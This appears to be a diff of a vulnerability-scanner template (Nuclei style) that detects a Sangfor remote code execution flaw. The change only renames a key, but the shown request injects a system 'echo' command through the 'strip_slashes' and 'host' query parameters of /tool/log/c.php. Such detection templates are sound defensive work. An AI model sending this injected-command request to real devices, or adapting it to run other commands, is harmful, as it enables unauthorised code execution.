@@ -4,7 +4,7 @@ info:
   author: Str1am
   severity: high
   tags: sangfor,rce
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/tool/log/c.php?strip_slashes=system&host=echo%2021232f297a57a5a743894a0e4a801fc3"
